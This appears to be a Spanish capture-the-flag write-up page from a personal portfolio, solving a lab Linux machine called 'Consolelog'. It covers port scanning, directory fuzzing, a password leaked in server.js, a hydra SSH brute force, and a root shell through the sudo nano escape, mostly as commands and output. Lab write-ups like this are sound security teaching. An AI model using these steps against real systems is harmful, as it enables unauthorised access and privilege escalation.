@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Walking Dead</title>
+    <link href="../style/estilo.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+
+<body class="bg-gray-900 text-white">
+
+    <nav class="bg-gray-800 text-white sticky top-0 z-50 shadow-md">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="flex justify-between items-center h-16">
+            <div class="flex-shrink-0">
+            <h1>Santiago Lorenzo</h1>
+            </div>
+            <div class="hidden md:flex space-x-4">
+            <a href="../index.html#inicio" class="hover:text-blue-400 transition">Inicio</a>
+            <a href="../index.html#certificados" class="hover:text-blue-400 transition">Certificaciones</a>
+            <a href="../index.html#proyectos" class="hover:text-blue-400 transition">Proyectos</a>
+            <a href="../writeups.html" class="hover:text-blue-400 transition">Write-ups</a>
+            </div>
+        </div>
+        </div>
+    </nav>
+
+    <main class="max-w-4xl mx-auto px-6 py-12">
+
+    <h1 class="text-4xl font-bold mb-2">🔹Maquina: Consolelog</h1>
+    <p class="text-gray-400 text-sm mb-8">📅 Publicado el 24/08/2025 | Categoría: LINUX </p>
+
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">📝 Descripción</h2>
+        <p class="text-gray-300 leading-relaxed">
+            Este reto consiste en comprometer una máquina Linux en un entorno controlado. No se proporciona una flag directa,
+            pero el objetivo es obtener acceso privilegiado (root) y entender el vector de escalada.
+        </p>
+    </section>
+
+    <!----------------- Análisis ----------------------->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🔍 Análisis inicial</h2>
+        <p class="text-gray-300 mb-4">
+            El análisis comenzó con un reconocimiento básico utilizando herramientas de enumeración para comprender los servicios expuestos.
+        </p>
+        <pre><code class="language-bash">
+            sudo nmap -p- -open -O -sS -sCV -min-rate 5000 -n -Pn -vvv 172.17.0.2
+            
+            PORT     STATE SERVICE REASON         VERSION
+            80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.61 ((Debian))
+            | http-methods: 
+            |_  Supported Methods: OPTIONS HEAD GET POST
+            |_http-title: Mi Sitio
+            |_http-server-header: Apache/2.4.61 (Debian)
+            3000/tcp open  http    syn-ack ttl 64 Node.js Express framework
+            |_http-title: Error
+            | http-methods: 
+            |_  Supported Methods: GET HEAD POST OPTIONS
+            5000/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+            | ssh-hostkey: 
+            |   256 f8:37:10:7e:16:a2:27:b8:3a:6e:2c:16:35:7d:14:fe (ECDSA)
+            | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFJIePZQO0+XTgRiD8dhTqAlZt67hcjqMdzF07uhb1UjckCZ085MdTFxg46SKaJRwi1OiB8GT+SeIlFbvm99Xkc=
+            |   256 cd:11:10:64:60:e8:bf:d9:a4:f4:8e:ae:3b:d8:e1:8d (ED25519)
+            |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIESd2Y3i6yTEAk2fPflmI3fA4pNsVZub38LafzPteZlz
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            entramos a Mi sitio, el cual no sirvio de nada
+        </p>
+
+        <img src="../Assets/consolelog/1_index.png" class="mb-4" alt="inicio">
+
+
+        <p class="text-gray-300 mb-4">
+            Hacemos fuzzing:
+        </p>
+
+        <pre><code class="language-bash">
+            gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50 -r
+
+                Starting gobuster in directory enumeration mode
+                ================================================
+                /.html                (Status: 403) [Size: 275]
+                /index.html           (Status: 200) [Size: 234]
+                /backend              (Status: 200) [Size: 1563]
+                /javascript           (Status: 403) [Size: 275]
+        </code></pre>
+
+        <img src="../Assets/consolelog/2_dir_backend.png" class="mb-4" alt="inicio">
+        
+        <p class="text-gray-300 mb-4">
+            Entramos a server.js ya que los otros archivos se crean automaticamente cuando se usa Node.js:
+        </p>
+
+        <img src="../Assets/consolelog/3_server-js.png" class="mb-4" alt="inicio">
+
+        <p class="text-gray-300 mb-4">
+            Encontramos lapassworddebackupmaschingonadetodas que usaremos para hacer fuerza bruta sobre ssh:
+        </p>
+
+        <pre><code class="language-bash">
+            hydra ssh://172.17.0.2:5000 -L /usr/share/wordlists/rockyou.txt -p lapassworddebackupmaschingonadetodas
+
+                [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+                [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+                [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:14344399/p:1), ~896525 tries per task
+                [DATA] attacking ssh://172.17.0.2:5000/
+                [5000][ssh] host: 172.17.0.2   login: lovely   password: lapassworddebackupmaschingonadetodas
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            Ya tenemos el usuario y la contraseña.
+        </p>
+
+    <!-- Explotación / Resolución -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">💣 Escalada de privilegios / Resolución</h2>
+
+        <pre><code class="language-bash">
+            sudo -l
+
+            NOPASS /usr/bin/nano
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            que el binario se ejecute como superusuario sudo, no se pierden los privilegios elevados y 
+            se puede utilizar para acceder al sistema de archivos, escalar o mantener el acceso privilegiado.
+        </p>
+
+        <pre><code class="language-bash">
+            sudo nano
+            ^R^X
+            reset; sh 1>&0 2>&0
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            Listo:
+        </p>
+
+        <pre><code class="language-bash">
+            whoami
+                root
+        </code></pre>
+    </section>
+
+    <!-- Resultado final -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🏆 Resultado</h2>
+        <p class="text-gray-300">
+            Conseguimos acceso como <code>root</code>.
+        </p>
+    </section>
+
+    <div class="mt-10">
+        <a href="../writeup.html"
+            class="inline-block bg-blue-500 px-6 py-2 rounded-lg text-white hover:bg-blue-700 transition">
+            ← Volver a la lista de Write-ups
+        </a>
+    </div>
+
+    </main>
+
+</body>
+</html>
